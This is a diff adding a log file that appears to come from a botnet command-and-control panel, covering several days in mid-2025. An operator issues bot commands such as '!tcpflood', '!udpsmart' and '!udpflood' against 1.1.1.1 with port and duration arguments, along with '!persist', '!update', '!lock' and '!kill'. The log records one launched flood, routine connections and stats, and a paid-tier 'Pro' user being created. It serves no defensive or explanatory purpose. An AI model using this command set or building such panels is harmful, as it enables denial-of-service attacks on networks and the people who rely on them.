@@ -1,0 +1,37 @@
+[2025-06-27 22:09:41] root: COMMAND - Sent command to bots: !tcpflood 1.1.1.1 22 22
+[2025-06-27 22:10:00] root: COMMAND - Sent command to bots: STOP 1.1.1.1
+[2025-06-27 23:01:33] SYSTEM: STATS - System stats - Load: 0.07, RAM: 11.65GB, Uptime: 3.25h, Cores: 16
+[2025-06-27 23:33:54] SYSTEM: CONNECTION - User connected from 127.0.0.1:34154
+[2025-06-27 23:34:37] SYSTEM: CONNECTION - User connected from 127.0.0.1:37810
+[2025-06-27 23:46:55] SYSTEM: CONNECTION - User connected from 172.17.112.1:49961
+[2025-06-27 23:47:26] SYSTEM: CONNECTION - User connected from 172.17.112.1:49995
+[2025-06-27 23:47:32] SYSTEM: CONNECTION - User connected from 127.0.0.1:59906
+[2025-06-27 23:48:18] SYSTEM: CONNECTION - User connected from 127.0.0.1:51546
+[2025-06-27 23:48:54] SYSTEM: CONNECTION - User connected from 127.0.0.1:41352
+[2025-06-28 00:19:22] SYSTEM: STATS - System stats - Load: 0.00, RAM: 11.65GB, Uptime: 4.47h, Cores: 16
+[2025-06-28 20:10:42] SYSTEM: STATS - System stats - Load: 0.00, RAM: 0.00GB, Uptime: 0.00h, Cores: 16
+[2025-06-28 20:40:42] SYSTEM: STATS - System stats - Load: 0.00, RAM: 0.00GB, Uptime: 0.00h, Cores: 16
+[2025-06-28 21:14:11] SYSTEM: STATS - System stats - Load: 0.00, RAM: 0.00GB, Uptime: 0.00h, Cores: 16
+[2025-06-28 21:44:11] SYSTEM: STATS - System stats - Load: 0.00, RAM: 0.00GB, Uptime: 0.00h, Cores: 16
+[2025-06-28 22:14:11] SYSTEM: STATS - System stats - Load: 0.00, RAM: 0.00GB, Uptime: 0.00h, Cores: 16
+[2025-06-28 22:39:44] root: COMMAND - Sent command to bots: !udpsmart 1.1.1.1 11 11
+[2025-06-28 22:41:26] root: COMMAND - Sent command to bots: !udpsmart 1.1.1.1 11 11
+[2025-06-28 22:42:11] root: COMMAND - Sent command to bots: !persist
+[2025-06-28 22:42:15] root: COMMAND - Sent command to bots: !update
+[2025-06-28 22:42:29] root: COMMAND - Sent command to bots: !lock
+[2025-06-28 22:42:33] root: COMMAND - Sent command to bots: !kill
+[2025-06-28 22:42:35] root: COMMAND - Sent command to bots: !persist
+[2025-06-28 22:42:38] root: COMMAND - Sent command to bots: !update
+[2025-06-28 23:11:08] SYSTEM: STATS - System stats - Load: 0.00, RAM: 0.00GB, Uptime: 0.00h, Cores: 16
+[2025-06-28 23:41:08] SYSTEM: STATS - System stats - Load: 0.00, RAM: 0.00GB, Uptime: 0.00h, Cores: 16
+[2025-06-29 00:11:08] SYSTEM: STATS - System stats - Load: 0.00, RAM: 0.00GB, Uptime: 0.00h, Cores: 16
+[2025-06-29 00:39:14] root: COMMAND - Sent command to bots: !udpflood 1.1.1.1 11 11
+[2025-06-29 00:50:56] root: COMMAND - Sent command to bots: !udpflood 1.1.1.1 11 11
+[2025-06-29 00:52:54] root: COMMAND - Sent command to bots: !udpflood 1.1.1.1 11 11
+[2025-06-29 00:56:13] root: COMMAND - Sent command to bots: !udpflood 1.1.1.1 11 11
+[2025-06-29 01:17:07] root: COMMAND - Sent command to bots: !udpflood 1.1.1.1 11 11
+[2025-06-29 01:47:26] SYSTEM: STATS - System stats - Load: 0.00, RAM: 11.65GB, Uptime: 7.47h, Cores: 16
+[2025-06-29 02:18:21] SYSTEM: STATS - System stats - Load: 0.00, RAM: 11.65GB, Uptime: 7.97h, Cores: 16
+[2025-07-01 00:03:18] root: ATTACK - Launched !udpflood attack on 1.1.1.1:22 for 22 seconds
+[2025-07-01 00:03:18] root: COMMAND - Sent command to bots: !udpflood 1.1.1.1 22 22 Rx6Vi2uPrcfc1mIb822kNVBjDm5qpnRruZ5h1tNfUKI=
+[2025-07-01 00:18:33] SYSTEM: USER - User bob created with level Pro
